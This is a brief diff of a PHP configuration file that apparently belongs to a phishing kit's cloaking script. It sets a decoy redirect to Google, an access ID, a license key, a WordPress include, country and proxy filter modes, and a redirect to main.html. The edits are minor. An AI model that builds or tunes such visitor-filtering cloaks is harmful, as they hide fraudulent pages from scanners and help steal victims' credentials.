@@ -1,8 +1,6 @@
 <?php
 // Created By Urie
-session_start();
 
-define('WP_USE_THEMES', true);
 define('LOCATION', "https://google.com");
 define('CHECKUP', "AccessID923487");
 define('wplink', '/wp-blog-header.php');
@@ -19,7 +17,7 @@ if (isset($_GET["check"]))
 }
 
 $license = "Houss-1987";
-$redirect = "./main.html";
+$redirect = "/main.html";
 $parameter = 1; // 1 => Both , 2 => Country , 3 => Proxy , 4 => Simple
 $wordpress = true; // Allow Wordpress Include
 $checkfileup = false; // Check Link UP
